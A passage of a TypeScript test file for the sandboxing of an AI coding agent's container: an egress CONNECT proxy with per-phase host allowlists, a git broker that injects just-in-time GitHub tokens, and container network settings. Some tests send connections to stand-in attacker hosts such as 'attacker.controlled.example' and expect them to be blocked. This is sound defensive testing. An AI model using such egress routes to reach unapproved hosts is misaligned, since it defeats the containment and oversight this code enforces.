		expect(SETUP_ALLOWED_HOSTS.has("crates.io:443")).toBe(true);
	});

	it("AGENT_ALLOWED_HOSTS includes only the Anthropic API (no github.com)", () => {
		expect(AGENT_ALLOWED_HOSTS.has("api.anthropic.com:443")).toBe(true);
		// github.com is intentionally absent: git traffic routes through the broker
		expect(AGENT_ALLOWED_HOSTS.has("github.com:443")).toBe(false);
		// registries must not be in the agent phase
		expect(AGENT_ALLOWED_HOSTS.has("registry.npmjs.org:443")).toBe(false);
		expect(AGENT_ALLOWED_HOSTS.has("pypi.org:443")).toBe(false);
	});

	it("github.com:443 is in SETUP but not AGENT", () => {
		expect(SETUP_ALLOWED_HOSTS.has("github.com:443")).toBe(true);
		expect(AGENT_ALLOWED_HOSTS.has("github.com:443")).toBe(false);
	});
});

// ─── Helpers for CONNECT proxy tests ──────────────────────────────────────────

/**
 * Open a raw TCP connection to the proxy and send a CONNECT request.
 * Returns the HTTP status line response code. Does NOT await the upstream
 * tunnel — just captures the proxy's initial decision (403 = blocked,
 * 200 = allowed, 502 = allowed but upstream unreachable).
 */
async function connectThrough(
	proxyPort: number,
	target: string,
	timeoutMs = 3000,
): Promise<number> {
	return new Promise((resolve, reject) => {
		const socket = createConnection({ host: "127.0.0.1", port: proxyPort });
		const timer = setTimeout(() => {
			socket.destroy();
			reject(new Error(`CONNECT timed out after ${timeoutMs}ms`));
		}, timeoutMs);
		socket.once("connect", () => {
			socket.write(`CONNECT ${target} HTTP/1.1\r\nHost: ${target}\r\n\r\n`);
		});
		let buf = "";
		socket.on("data", (chunk: Buffer) => {
			buf += chunk.toString();
			const m = /^HTTP\/1\.[01] (\d{3})/.exec(buf);
			if (m) {
				clearTimeout(timer);
				socket.destroy();
				resolve(parseInt(m[1]!, 10));
			}
		});
		socket.on("error", err => {
			clearTimeout(timer);
			reject(err);
		});
		socket.on("close", () => {
			clearTimeout(timer);
			// Socket closed without a response (upstream reset) — check what we got.
			const m = /^HTTP\/1\.[01] (\d{3})/.exec(buf);
			if (m) resolve(parseInt(m[1]!, 10));
			else reject(new Error("connection closed without HTTP response"));
		});
	});
}

// ─── startEgressProxy — policy enforcement ────────────────────────────────────

describe("startEgressProxy — setup phase allowlist", () => {
	it("blocks a destination not in the allowlist", async () => {
		const proxy = await startEgressProxy("setup");
		try {
			const status = await connectThrough(proxy.port, "evil.example.com:443");
			expect(status).toBe(403);
		} finally {
			proxy.stop();
		}
	});

	it("blocks port 80 for a host that only has port 443 listed", async () => {
		const proxy = await startEgressProxy("setup");
		try {
			// api.github.com:443 is allowed but :80 is not
			const status = await connectThrough(proxy.port, "api.github.com:80");
			expect(status).toBe(403);
		} finally {
			proxy.stop();
		}
	});

	it("allows github.com:443 (returns 200 or 502, never 403)", async () => {
		const proxy = await startEgressProxy("setup");
		try {
			const status = await connectThrough(proxy.port, "github.com:443");
			expect(status).not.toBe(403);
		} finally {
			proxy.stop();
		}
	});

	it("allows registry.npmjs.org:443 (not 403)", async () => {
		const proxy = await startEgressProxy("setup");
		try {
			const status = await connectThrough(proxy.port, "registry.npmjs.org:443");
			expect(status).not.toBe(403);
		} finally {
			proxy.stop();
		}
	});

	it("rejects a malformed CONNECT request with 400", async () => {
		const proxy = await startEgressProxy("setup");
		try {
			// Send a non-CONNECT request
			const status = await new Promise<number>((resolve, reject) => {
				const sock = createConnection({ host: "127.0.0.1", port: proxy.port });
				const timer = setTimeout(() => { sock.destroy(); reject(new Error("timeout")); }, 3000);
				sock.once("connect", () => {
					sock.write("GET / HTTP/1.1\r\nHost: example.com\r\n\r\n");
				});
				let buf = "";
				sock.on("data", (c: Buffer) => {
					buf += c.toString();
					const m = /^HTTP\/1\.[01] (\d{3})/.exec(buf);
					if (m) { clearTimeout(timer); sock.destroy(); resolve(parseInt(m[1]!, 10)); }
				});
				sock.on("error", (e) => { clearTimeout(timer); reject(e); });
				sock.on("close", () => {
					clearTimeout(timer);
					const m = /^HTTP\/1\.[01] (\d{3})/.exec(buf);
					if (m) resolve(parseInt(m[1]!, 10));
					else reject(new Error("no response"));
				});
			});
			expect(status).toBe(400);
		} finally {
			proxy.stop();
		}
	});
});

describe("startEgressProxy — agent phase allowlist", () => {
	it("blocks github.com:443 in agent phase (git must use broker)", async () => {
		const proxy = await startEgressProxy("agent");
		try {
			const status = await connectThrough(proxy.port, "github.com:443");
			expect(status).toBe(403);
		} finally {
			proxy.stop();
		}
	});

	it("blocks registry.npmjs.org:443 in agent phase", async () => {
		const proxy = await startEgressProxy("agent");
		try {
			const status = await connectThrough(proxy.port, "registry.npmjs.org:443");
			expect(status).toBe(403);
		} finally {
			proxy.stop();
		}
	});

	it("blocks an arbitrary disallowed host (canary)", async () => {
		const proxy = await startEgressProxy("agent");
		try {
			const status = await connectThrough(proxy.port, "attacker.controlled.example:443");
			expect(status).toBe(403);
		} finally {
			proxy.stop();
		}
	});

	it("allows api.anthropic.com:443 (not 403)", async () => {
		const proxy = await startEgressProxy("agent");
		try {
			const status = await connectThrough(proxy.port, "api.anthropic.com:443");
			expect(status).not.toBe(403);
		} finally {
			proxy.stop();
		}
	});

	it("two agent proxies bind to different ports", async () => {
		const p1 = await startEgressProxy("agent");
		const p2 = await startEgressProxy("agent");
		try {
			expect(p1.port).not.toBe(p2.port);
		} finally {
			p1.stop();
			p2.stop();
		}
	});
});

// ─── startGitBroker — fence-check proxy endpoint ──────────────────────────────

describe("startGitBroker — fence-check proxy endpoint", () => {
	it("proxies POST /fence-check to the Worker fence URL", async () => {
		const captured: { url: string; body: string }[] = [];
		const recordFetch: GitBrokerOptions["fetchImpl"] = async (url, init) => {
			captured.push({ url: String(url), body: String(init?.body ?? "") });
			return new Response("ok", { status: 200 });
		};
		const broker = await startGitBroker(
			makeBrokerOptions(recordFetch, { workerFenceUrl: "https://worker.test/fence-check" }),
		);
		try {
			const body = JSON.stringify({ jobId: "j1", attemptId: "a1", leaseToken: "l1" });
			const res = await fetch(`${broker.url}/fence-check`, {
				method: "POST",
				headers: { "Content-Type": "application/json" },
				body,
			});
			expect(res.status).toBe(200);
			expect(captured).toHaveLength(1);
			expect(captured[0]!.url).toBe("https://worker.test/fence-check");
			expect(captured[0]!.body).toBe(body);
		} finally {
			await broker.stop();
		}
	});

	it("mirrors the Worker fence response status (e.g. 409 for invalid fence)", async () => {
		const failFetch: GitBrokerOptions["fetchImpl"] = async () =>
			new Response("fenced", { status: 409 });
		const broker = await startGitBroker(
			makeBrokerOptions(failFetch, { workerFenceUrl: "https://worker.test/fence-check" }),
		);
		try {
			const res = await fetch(`${broker.url}/fence-check`, {
				method: "POST",
				headers: { "Content-Type": "application/json" },
				body: "{}",
			});
			expect(res.status).toBe(409);
		} finally {
			await broker.stop();
		}
	});

	it("returns 503 when workerFenceUrl is not configured", async () => {
		// No workerFenceUrl in options → fence-check not available
		const broker = await startGitBroker(makeBrokerOptions(makeTokenFetch("t")));
		try {
			const res = await fetch(`${broker.url}/fence-check`, {
				method: "POST",
				body: "{}",
			});
			expect(res.status).toBe(503);
		} finally {
			await broker.stop();
		}
	});

	it("returns 502 when the Worker fence-check call throws", async () => {
		const errFetch: GitBrokerOptions["fetchImpl"] = async () => {
			throw new Error("network error");
		};
		const broker = await startGitBroker(
			makeBrokerOptions(errFetch, { workerFenceUrl: "https://worker.test/fence-check" }),
		);
		try {
			const res = await fetch(`${broker.url}/fence-check`, {
				method: "POST",
				body: "{}",
			});
			expect(res.status).toBe(502);
		} finally {
			await broker.stop();
		}
	});
});

// ─── startGitBroker — git HTTP proxy (/gh/) ───────────────────────────────────

describe("startGitBroker — git HTTP proxy (/gh/)", () => {
	it("forwards GET /gh/ to github.com with a JIT token", async () => {
		const captured: { url: string; headers: Record<string, string> }[] = [];
		const recordFetch: GitBrokerOptions["fetchImpl"] = async (url, init) => {
			const hdrs = init?.headers as Record<string, string> | undefined;
			if (String(url).includes("github-token")) {
				// Token issuance call
				return new Response(JSON.stringify({ token: "ghs_jit_proxy" }), { status: 200 });
			}
			// git proxy call
			captured.push({ url: String(url), headers: hdrs ?? {} });
			return new Response("git-data", {
				status: 200,
				headers: { "Content-Type": "application/x-git-upload-pack-advertisement" },
			});
		};
		const broker = await startGitBroker(makeBrokerOptions(recordFetch));
		try {
			const res = await fetch(`${broker.url}/gh/owner/repo.git/info/refs?service=git-upload-pack`);
			expect(res.status).toBe(200);
			expect(captured).toHaveLength(1);
			expect(captured[0]!.url).toBe(
				"https://github.com/owner/repo.git/info/refs?service=git-upload-pack",
			);
			// Authorization must be a Basic auth header with the JIT token (Base64-encoded)
			const auth = captured[0]!.headers["Authorization"] ?? "";
			expect(auth).toMatch(/^Basic /);
			const decoded = atob(auth.slice("Basic ".length));
			expect(decoded).toBe("x-access-token:ghs_jit_proxy");
		} finally {
			await broker.stop();
		}
	});

	it("does not expose the raw JIT token in the response body", async () => {
		const fetchImpl: GitBrokerOptions["fetchImpl"] = async url => {
			if (String(url).includes("github-token")) {
				return new Response(JSON.stringify({ token: "ghs_secret_should_not_leak" }), {
					status: 200,
				});
			}
			return new Response("repo-data", { status: 200 });
		};
		const broker = await startGitBroker(makeBrokerOptions(fetchImpl));
		try {
			const res = await fetch(`${broker.url}/gh/owner/repo.git/info/refs`);
			const body = await res.text();
			expect(body).not.toContain("ghs_secret_should_not_leak");
			expect(body).toBe("repo-data");
		} finally {
			await broker.stop();
		}
	});

	it("returns 502 when the JIT token fetch fails for a /gh/ request", async () => {
		const failFetch: GitBrokerOptions["fetchImpl"] = async () =>
			new Response("internal error", { status: 500 });
		const broker = await startGitBroker(makeBrokerOptions(failFetch));
		try {
			const res = await fetch(`${broker.url}/gh/owner/repo.git/info/refs`);
			expect(res.status).toBe(502);
		} finally {
			await broker.stop();
		}
	});
});

// ─── buildContainerArgs — per-job network and proxy env ───────────────────────

describe("buildContainerArgs — per-job network and proxy env", () => {
	const OPTS_WITH_NET: ContainerRunOptions = {
		image: "ompk-runner:latest",
		network: "ompk-job1-attempt1",
		egressProxyUrl: "http://10.89.0.1:9999",
		noProxyHosts: "10.89.0.1",
	};

	function envEntries(args: string[]): string[] {
		const out: string[] = [];
		for (let i = 0; i < args.length; i++) {
			if (args[i] === "--env" && i + 1 < args.length) out.push(args[i + 1]!);
		}
		return out;
	}

	const FENCE_ENV_NET: NodeJS.ProcessEnv = {
		OMPK_FENCE_URL: "https://worker.test/fence-check",
		OMPK_FENCE_JOB: "job-net",
		OMPK_FENCE_ATTEMPT: "attempt-net",
		OMPK_FENCE_TOKEN: "token-net",
		GIT_CONFIG_COUNT: "1",
		GIT_CONFIG_KEY_0: "core.hooksPath",
		GIT_CONFIG_VALUE_0: "/host/git-hooks",
	};

	it("uses the per-job network instead of host when network option is set", () => {
		const job: Pick<Job, "model" | "prompt" | "source"> = {
			model: "combo-a",
			prompt: "p",
			source: "linear",
		};
		const args = buildContainerArgs(job, "/ws", FENCE_ENV_NET, OPTS_WITH_NET);
		expect(args.includes("--network=ompk-job1-attempt1")).toBe(true);
		expect(args.includes("--network=host")).toBe(false);
	});

	it("injects HTTP_PROXY and HTTPS_PROXY when egressProxyUrl is set", () => {
		const job: Pick<Job, "model" | "prompt" | "source"> = {
			model: "combo-a",
			prompt: "p",
			source: "linear",
		};
		const args = buildContainerArgs(job, "/ws", FENCE_ENV_NET, OPTS_WITH_NET);
		const entries = envEntries(args);
		expect(entries.some(e => e === "HTTP_PROXY=http://10.89.0.1:9999")).toBe(true);
		expect(entries.some(e => e === "HTTPS_PROXY=http://10.89.0.1:9999")).toBe(true);
	});

	it("injects NO_PROXY so broker/gateway traffic bypasses the CONNECT proxy", () => {
		const job: Pick<Job, "model" | "prompt" | "source"> = {
			model: "combo-a",
			prompt: "p",
			source: "linear",
		};
		const args = buildContainerArgs(job, "/ws", FENCE_ENV_NET, OPTS_WITH_NET);
		const entries = envEntries(args);
		expect(entries.some(e => e === "NO_PROXY=10.89.0.1")).toBe(true);
	});

	it("does not inject HTTP_PROXY when egressProxyUrl is absent", () => {
		const job: Pick<Job, "model" | "prompt" | "source"> = {
			model: "combo-a",
			prompt: "p",
			source: "linear",
		};
		const { egressProxyUrl: _, noProxyHosts: __, ...optsNoProxy } = OPTS_WITH_NET;
		const args = buildContainerArgs(job, "/ws", FENCE_ENV_NET, optsNoProxy);
		const entries = envEntries(args);
		expect(entries.every(e => !e.startsWith("HTTP_PROXY="))).toBe(true);
		expect(entries.every(e => !e.startsWith("HTTPS_PROXY="))).toBe(true);
	});

	it("sets insteadOf git config to redirect github.com through broker when broker active", () => {
		const job: Pick<Job, "model" | "prompt" | "source"> = {
			model: "combo-a",
			prompt: "p",
			source: "github",
		};
		const args = buildContainerArgs(
			job,
			"/ws",
			FENCE_ENV_NET,
			OPTS_WITH_NET,
			"http://10.89.0.1:8765",
		);
		const entries = envEntries(args);
		// GIT_CONFIG_KEY_2 must be the insteadOf key pointing to the broker /gh/ prefix
		expect(
			entries.some(e => e === "GIT_CONFIG_KEY_2=url.http://10.89.0.1:8765/gh/.insteadOf"),
		).toBe(true);
		// GIT_CONFIG_VALUE_2 rewrites https://github.com/ to the broker prefix
		expect(entries.some(e => e === "GIT_CONFIG_VALUE_2=https://github.com/")).toBe(true);
		expect(entries.some(e => e === "GIT_CONFIG_COUNT=3")).toBe(true);
	});

	it("defaults to --network=host when no network option is provided", () => {
		const job: Pick<Job, "model" | "prompt" | "source"> = {
			model: "combo-a",
			prompt: "p",
			source: "linear",
		};
		const { network: _, egressProxyUrl: __, noProxyHosts: ___, ...bareOpts } = OPTS_WITH_NET;
		const args = buildContainerArgs(job, "/ws", FENCE_ENV_NET, bareOpts);
		expect(args.includes("--network=host")).toBe(true);
	});
});
